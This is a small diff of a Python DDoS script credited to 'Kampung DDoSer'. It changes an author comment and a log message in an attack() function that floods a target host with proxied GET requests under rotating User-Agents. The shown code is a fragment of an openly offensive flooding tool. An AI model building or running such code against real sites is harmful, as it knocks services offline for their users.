@@ -1,5 +1,5 @@
 # -*- coding: utf-8 -*-
-# Original Author : Kampung DDoSer
+# Original Author : Kampung DDoSer @ Fatallerror89
 # Recoded and Updated by Vip3rLi0n
 
 import random
@@ -56,7 +56,7 @@ def attack(session, proxy, ua, time_str):
         response = session.get(f"{args.hostname}:{port}/", headers={"User-Agent": user_agent}, proxies=proxy_get, timeout=10)
         response_text = response.text
         if response_text:
-            print(f'[{time_str}] Target Attacked from: {proxy}')
+            print(f'[{time_str}] Kampung DDoS Attacked from: {proxy}')
     except requests.Timeout:
         print(f'[{time_str}] Request timed out from: {proxy}')
     except Exception as e:
